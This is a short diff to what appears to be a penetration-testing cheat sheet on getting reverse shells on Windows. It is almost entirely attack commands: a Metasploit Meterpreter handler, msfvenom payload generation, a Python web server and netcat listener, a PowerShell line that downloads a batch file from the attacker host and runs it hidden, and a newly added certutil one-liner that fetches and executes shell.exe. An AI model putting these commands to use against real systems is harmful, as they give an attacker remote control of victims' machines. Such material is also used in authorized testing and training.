@@ -6,7 +6,6 @@ msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/rev
 
 
 
-
 using powercat:
 ```bash
 attacker machine:
@@ -31,7 +30,12 @@ msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.ba
 python3 -m http.server 9090
 nc -nvlp 4444
 
-target system:
+target systm:
 Invoke-WebRequest -Uri "http://192.168.1.120:9090/shell.bat" -OutFile "$env:TEMP\shell.bat"; Start-Process "$env:TEMP\shell.bat" -WindowStyle Hidden
 
+```
+
+using certutil.exe 
+```bash
+certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
 ```
